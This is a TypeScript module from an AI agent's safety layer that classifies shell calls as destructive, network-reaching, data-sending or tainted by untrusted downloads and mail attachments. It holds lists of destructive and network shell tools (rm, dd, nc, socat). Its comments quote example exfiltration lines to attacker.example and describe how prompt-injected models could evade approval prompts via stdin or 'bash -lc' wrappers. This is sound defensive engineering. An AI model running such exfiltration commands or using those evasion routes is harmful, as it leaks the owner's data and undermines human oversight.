/**
 * What a command is, read off the invocation: what it runs, where it writes, what it reaches, and
 * whether what came back is the owner's own bytes or somebody else's.
 *
 * Lifted out of tools.ts unchanged. Every classifier here answers a question about one `shell`
 * call - or about a script that call hands to an interpreter - and the whole point of keeping them
 * in one file is that they must agree with each other: `commandScript` is the single reader of
 * where a script was written down, and a classifier that reads `args` alone instead is exactly how
 * `stdin` walked past all of them at once.
 *
 * `tools.ts` re-exports what it always exported, so no caller moved.
 *
 * The download-quarantine trio sits here rather than with the write classifiers because
 * `untrustedShellOrigin` reads it: a `cat workspace/downloads/terms.txt` is a tainted read, and
 * putting the predicate in write-classification.ts - which already imports this module for
 * `gitSubcommand` and the package-manager sets - would close a cycle between the two.
 */
import { textValue } from './surface-actions.js';

export const FILE_WRITING_EXECUTABLES = new Set([
  'chmod',
  'chown',
  'cp',
  'install',
  'ln',
  'mkdir',
  'mv',
  'patch',
  'rename',
  'rsync',
  'tar',
  'tee',
  'touch',
  'unzip'
]);

export const WRITING_GIT_SUBCOMMANDS = new Set([
  'add',
  'am',
  'apply',
  'checkout',
  'cherry-pick',
  'clean',
  'commit',
  'init',
  'merge',
  'mv',
  'push',
  'rebase',
  'reset',
  'restore',
  'revert',
  'rm',
  'stash',
  'switch',
  'tag'
]);

export const consequentialExecutables = new Set([
  'rm',
  'rmdir',
  'unlink',
  'shred',
  'truncate',
  'shutdown',
  'reboot',
  'poweroff',
  'halt',
  'kill',
  'killall',
  'pkill',
  'dd',
  'wipefs'
]);
/**
 * Commands whose whole job is to run another command. What they run is what matters; the wrapper
 * itself changes nothing.
 */
export const COMMAND_RUNNERS = new Set([
  'env',
  'flock',
  'ionice',
  'nice',
  'nohup',
  'setsid',
  'stdbuf',
  'time',
  'timeout',
  'watch',
  'xargs'
]);

export const commandInterpreters = new Set([
  'sh',
  'bash',
  'dash',
  'zsh',
  'python',
  'python3',
  'node',
  'perl',
  'ruby'
]);

const INLINE_SCRIPT_FLAGS = ['-c', '-lc', '-e', '--eval'];

/** The script text an interpreter was handed inline, or '' when it was given a file to run. */
export const inlineScriptBody = (args: readonly string[]): string =>
  args
    .flatMap((argument, index) => {
      if (INLINE_SCRIPT_FLAGS.includes(argument)) return [args[index + 1] ?? ''];
      const separator = argument.indexOf('=');
      return separator > 0 && INLINE_SCRIPT_FLAGS.includes(argument.slice(0, separator))
        ? [argument.slice(separator + 1)]
        : [];
    })
    .join('\n');

/**
 * Everything the command will actually execute, wherever it was written down.
 *
 * `shell` accepts a `stdin` string, and an interpreter reads a script from it exactly as it reads
 * one from `-c`. Every classifier here - the destinations it may reach, the paths it writes, whether
 * it is destructive, whether it came from untrusted content - read only `executable` and `args`, so
 * moving the script into `stdin` walked past all of them at once. It appeared once in this file, in
 * the schema that declares it, and nowhere else.
 */
export const commandScript = (args: Record<string, unknown>): string => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  return [inlineScriptBody(commandArgs), textValue(args.stdin)].filter(Boolean).join('\n');
};

/**
 * A redirection whose target leaves the workspace: absolute, home-relative, or climbing out with
 * `..`. `2>&1`, `->` and a plain `>` comparison are all excluded by construction, since none of
 * them is followed by a path shaped like one of those three.
 *
 * The discard sinks and the scratch directories are not escapes. `>/dev/null` is how every noisy
 * converter on this computer is silenced, and it removes nothing - but it is an absolute path, so
 * it stopped the task and asked the owner to approve a command that could not destroy anything.
 * That was very likely a larger share of the interruptions than any real delete.
 */
const HARMLESS_REDIRECT_TARGET = /^(?:\/dev\/(?:null|stdout|stderr|zero|tty)|\/(?:var\/)?tmp\/)/;
const escapingRedirect = (body: string): boolean => {
  for (const match of body.matchAll(/(?<![->\d])>>?\s*['"]?((?:\/|~\/|\.\.\/)[^\s'";|&)]*)/g)) {
    if (!HARMLESS_REDIRECT_TARGET.test(match[1] ?? '')) return true;
  }
  return false;
};

/**
 * Whether an inline script is destructive, rather than merely inline.
 *
 * `shell` performs no expansion, so an interpreter is the only way to pipe, glob or redirect - and
 * the built-in procedures use one constantly: reading a zip's table of contents, counting PDF
 * pages, listing installed fonts. Classifying every `-c` as destructive put a card reading "this
 * can remove or overwrite data" in front of each of those, and an owner who taps through five
 * wrong warnings taps through the sixth one that matters. So the body is scanned for the same
 * things that would escalate a bare command, plus the language-level equivalents an interpreter
 * makes reachable. Writing the identical script to a file and running it stays unescalated, which
 * is the honest reading of the rule rather than a hole in it: neither is destructive by itself.
 */
/**
 * A delete written through a language runtime, whoever the receiver happens to be called.
 *
 * This used to require the literal text `fs.`, so `require('fs').rmSync('/home/athanor')` and the
 * same call through any local name went through with no card at all - while `rm -f` on the
 * workspace's own scratch directory stopped the task. The control refused the honest phrasing and
 * missed the evasive one. Matching the method rather than the receiver closes that, and these
 * names are specific enough not to catch ordinary code: `remove` on its own is not among them,
 * because every list in every language has one.
 */
const DESTRUCTIVE_RUNTIME_CALL =
  /\.(?:rm|rmSync|rmdir|rmdirSync|unlink|unlinkSync|rmtree|removedirs)\s*\(/;

export const isDestructiveScript = (body: string): boolean =>
  new RegExp(
    `(?<![\\w.])(?:${[...consequentialExecutables].join('|')}|mkfs[\\w.-]*|shutil\\.rmtree|os\\.(?:remove|removedirs|rmdir|unlink))(?![\\w])`
  ).test(body) ||
  DESTRUCTIVE_RUNTIME_CALL.test(body) ||
  escapingRedirect(body);
export const safeNetworkExecutables = new Set([
  'apt',
  'apt-get',
  'brew',
  'cargo',
  'curl',
  'dig',
  'dnf',
  'git',
  'go',
  'host',
  'npm',
  'nslookup',
  'pip',
  'pip3',
  'ping',
  'pnpm',
  'wget',
  'yarn'
]);
/**
 * The commands a script actually runs, each one as [executable, ...arguments].
 *
 * The shell tool's own description tells the model to reach for `bash -lc` the moment it needs a
 * pipe, a glob or a redirect, so most real work arrives wrapped in an interpreter. Every other
 * classifier here already reads the real script through commandScript; the network allowlist was
 * the last policy still matching on the name of the wrapper, so `curl -O https://x` was allowlisted
 * and `bash -lc 'curl -O https://x'` - the same fetch - was an unknown executable. In autonomous
 * mode that is a card in front of nearly everything, and one download produced two of them.
 *
 * This is deliberately not a shell parser. It splits on the operators that begin a new command and
 * keeps the leading word of each, which is enough to name what runs. Anything it cannot read comes
 * back as no commands at all, and the caller treats that as unknown rather than as safe.
 */
export const scriptCommands = (body: string): string[][] =>
  body
    .split(/\$\(|[|;&\n`]+/)
    .map((segment) => {
      const tokens = segment
        .replace(/^[\s({]+/, '')
        .split(/\s+/)
        .filter(Boolean);
      // `FOO=1 curl https://x` runs curl. A leading assignment is setup for the command that
      // follows it, not a command of its own, and treating it as one made every such line unknown.
      while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[0] ?? '')) tokens.shift();
      const executable = (tokens.shift() ?? '').split('/').pop() ?? '';
      return executable ? [executable, ...tokens] : [];
    })
    .filter((command) => command.length > 0);

/**
 * Whether a command sends data out rather than only fetching. This lived inline in the shell
 * branch, where it could only ever ask the question about the executable the tool was handed; it
 * has to be askable of a command found inside a script too, or reading the script body would turn
 * `bash -lc 'curl -d @secrets https://x'` into an allowlisted curl and quietly drop the card the
 * bare form raises.
 */
export const sendsDataOverNetwork = (executable: string, commandArgs: string[]): boolean => {
  const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
  const curlWrites =
    executable === 'curl' &&
    (commandArgs.includes('-F') ||
      lowerArgs.some(
        (argument, index) =>
          [
            '-d',
            '--data',
            '--data-ascii',
            '--data-binary',
            '--data-raw',
            '--data-urlencode',
            '--form',
            '--form-string',
            '-t',
            '--upload-file'
          ].includes(argument) ||
          ((argument === '-x' || argument === '--request') &&
            !['get', 'head', 'options'].includes(lowerArgs[index + 1] ?? ''))
      ));
  const wgetWrites =
    executable === 'wget' &&
    lowerArgs.some(
      (argument, index) =>
        argument.startsWith('--post-data=') ||
        argument.startsWith('--post-file=') ||
        argument.startsWith('--body-data=') ||
        argument.startsWith('--body-file=') ||
        ((argument === '--method' || argument.startsWith('--method=')) &&
          !['get', 'head', 'options'].includes(
            argument.includes('=') ? (argument.split('=')[1] ?? '') : (lowerArgs[index + 1] ?? '')
          ))
    );
  const ghReadOnly =
    executable === 'gh' &&
    ((lowerArgs[0] === 'api' &&
      !lowerArgs.some(
        (argument, index) =>
          ['-f', '--raw-field', '-f', '--field', '--input'].includes(argument) ||
          ((argument === '-x' || argument === '--method') &&
            !['get', 'head', 'options'].includes(lowerArgs[index + 1] ?? ''))
      )) ||
      ['status', 'search'].includes(lowerArgs[0] ?? '') ||
      (['repo', 'issue', 'pr', 'run', 'workflow', 'release'].includes(lowerArgs[0] ?? '') &&
        ['list', 'view', 'status', 'checks'].includes(lowerArgs[1] ?? '')));
  return curlWrites || wgetWrites || (executable === 'gh' && !ghReadOnly);
};

export const packageRemovalExecutables = new Set([
  // Every system package manager, not only the one this box happens to run: the approval a package
  // install raises has to be the same question on a Fedora, Rocky or Arch host as on a Debian one.
  'apk',
  'apt',
  'apt-get',
  'aptitude',
  'brew',
  'cargo',
  'dnf',
  'dnf5',
  'emerge',
  'microdnf',
  'npm',
  'pacman',
  'pip',
  'pip3',
  'pnpm',
  'yarn',
  'yay',
  'yum',
  'zypper'
]);
export const packageRemovalCommands = new Set(['remove', 'uninstall', 'purge', 'autoremove']);
export const packageInstallCommands = new Set([
  'add',
  'install',
  'update',
  'upgrade',
  'dist-upgrade',
  'full-upgrade'
]);
const gitOptionsWithSeparateValue = new Set([
  '-c',
  '-C',
  '--config-env',
  '--exec-path',
  '--git-dir',
  '--namespace',
  '--super-prefix',
  '--work-tree'
]);

/**
 * `git -C sub push` and `git --git-dir=... push` reach the same remote as a bare `git push`, so the
 * approval floor is keyed on the real subcommand rather than on the first argument.
 */
export const gitSubcommand = (args: string[]): string | null => {
  for (let index = 0; index < args.length; index += 1) {
    const argument = args[index] ?? '';
    if (!argument.startsWith('-')) return argument.toLowerCase();
    if (argument.includes('=')) continue;
    if (gitOptionsWithSeparateValue.has(argument)) index += 1;
  }
  return null;
};

/**
 * Every http(s) address named anywhere in a shell call, including inside an inline script.
 *
 * `shell` has no network flag it must set to reach the internet - the installer ships the
 * per-command namespace off, because a command with its own loopback breaks published previews - so
 * `network: true` is a declaration rather than a gate. An exfiltration does not have to declare
 * itself: `curl https://attacker.example/?q=<the mailbox>` is a read-shaped GET, it trips none of
 * the write-flag checks below, and it is the same clean channel `parallel_web_read` is already
 * judged on. So while the turn is tainted the addresses are pulled out of the command itself and
 * run through the same destination policy.
 */
const URL_IN_COMMAND = /https?:\/\/[^\s'"`<>\\)]+/g;

const shellDestinations = (args: Record<string, unknown>): string[] => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const command = [textValue(args.executable), ...commandArgs, commandScript(args)].join(' ');
  return [...new Set(command.match(URL_IN_COMMAND) ?? [])];
};

/**
 * Every address one tool call would reach, whichever tool it is.
 *
 * One list, because two of them drift: the approval floor asks what a call reaches in order to
 * judge it, and the turn's novelty budget asks the same question in order to charge it, and an
 * address only one of them knows about is either an unjudged request or an unpaid one. A batch is
 * twenty-four actions wearing one action name, so the navigate inside one is here too.
 */
export const callDestinations = (name: string, args: Record<string, unknown>): string[] => {
  if (name === 'parallel_web_read') return Array.isArray(args.urls) ? args.urls.map(String) : [];
  if (name === 'browser_action')
    return [
      textValue(args.url),
      ...(Array.isArray(args.actions)
        ? args.actions.map((step) => textValue((step as { url?: unknown } | null)?.url))
        : [])
    ].filter(Boolean);
  if (name === 'shell' || name === 'desktop_launch') return shellDestinations(args);
  return [];
};

/**
 * Where the browser and the network-reaching commands drop what they fetched.
 *
 * Everything under it is bytes somebody else wrote, sitting in the owner's own workspace, which is
 * the one place the "reads of the owner's computer are not tainted" rule has to make an exception
 * for. Declared here rather than beside the classifier in the agent loop because both the file
 * readers and `shell` have to agree on it, and two lists would drift.
 */
export const DOWNLOAD_QUARANTINE_PREFIXES = [
  'workspace/downloads/',
  'downloads/',
  // The attachment directory is the same fact by another route. context.ts tells the model, in the
  // always-resident operating contract, to save an attachment into the workspace before reading it
  // there, and agent.ts saves it here - so the bytes a stranger e-mailed arrived in the workspace
  // wearing the owner's own clothes. The connector read taints the turn that fetched it; a later
  // task reading the file back was judged clean, and on a clean turn the egress budget is not
  // charged, a write to ATHANOR.md raises no card and a read of any host raises no card.
  'workspace/mail/',
  'mail/'
];

/** A workspace path as the quarantine rule compares it: leading `./` and `/` stripped. */
const quarantineRelative = (path: string): string => path.replace(/^\.?\//, '');

export const isQuarantinedDownloadPath = (path: string): boolean =>
  DOWNLOAD_QUARANTINE_PREFIXES.some((prefix) => quarantineRelative(path).startsWith(prefix));

/**
 * Git subcommands that talk to a remote. The rest of git is local history, and a rule that treated
 * `git status` as a network read would taint most of the repository work this product exists for.
 */
const NETWORK_GIT_SUBCOMMANDS = new Set([
  'clone',
  'fetch',
  'pull',
  'ls-remote',
  'submodule',
  'archive'
]);

/**
 * Commands whose whole purpose is to bring back what is at the other end of a connection. Unlike
 * git and the package managers there is no local mode to distinguish, so the executable settles it.
 */
const NETWORK_CLIENT_EXECUTABLES = new Set([
  'aria2c',
  'curl',
  'ftp',
  'gh',
  'http',
  'httpie',
  'nc',
  'ncat',
  'netcat',
  'scp',
  'sftp',
  'socat',
  'ssh',
  'wget',
  'yt-dlp',
  'youtube-dl'
]);

/**
 * Where the untrusted content in a `shell` result came from, or null when the command only touched
 * the owner's own computer.
 *
 * Two channels, both reachable by an attacker and neither of them labelled until now.
 *
 * The first is the command that fetches. `network: true` was the whole test, and it is a
 * declaration rather than a gate: the installer ships the per-command namespace off, because a
 * command with its own loopback breaks published previews, so `curl https://attacker.example/brief`
 * reaches the internet whether or not the model ticked the box - and a model following an injected
 * instruction has every reason not to tick it. So the invocation is judged instead: a client whose
 * only job is to fetch, a git subcommand that talks to a remote, a package manager installing or
 * updating, or an http(s) address named anywhere in the command including inside an inline script.
 * The last one is what covers `python3 -c` and every interpreter after it without naming any of
 * them. What is deliberately not here is the rest of git, the rest of the package managers, and
 * every build and test command - `git status` and `pnpm test` read nothing from outside, and a
 * floor that rose on them would raise a card on the ordinary work and be tapped through.
 *
 * The second is the download directory. `file_read`, `document_read` and `image_read` have always
 * treated it as quarantine; `shell` did not, so `cat workspace/downloads/terms.txt` put the same
 * bytes into the same window with the floor still reporting the turn as clean.
 */
export const untrustedShellOrigin = (args: Record<string, unknown>): string | null => {
  const executable = textValue(args.executable).split('/').pop()?.toLowerCase() ?? '';
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const script = commandScript(args);
  const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
  const networkGit =
    executable === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand(commandArgs) ?? '');
  const packageFetch =
    packageRemovalExecutables.has(executable) &&
    lowerArgs.some((argument) => packageInstallCommands.has(argument));
  if (
    args.network === true ||
    NETWORK_CLIENT_EXECUTABLES.has(executable) ||
    networkGit ||
    packageFetch ||
    shellDestinations(args).length > 0
  )
    return 'network command output';
  // Split on the same separators the durable-path rule uses, so a redirect or a pipe inside an
  // inline script cannot hide the path the way `cat < downloads/x` would past a bare argument scan.
  const tokens = [...commandArgs, ...script.split(/[\s'"`>|;()<]+/)].filter(Boolean);
  const quarantined = tokens.find(isQuarantinedDownloadPath);
  return quarantined ? `downloaded file ${quarantineRelative(quarantined)}` : null;
};
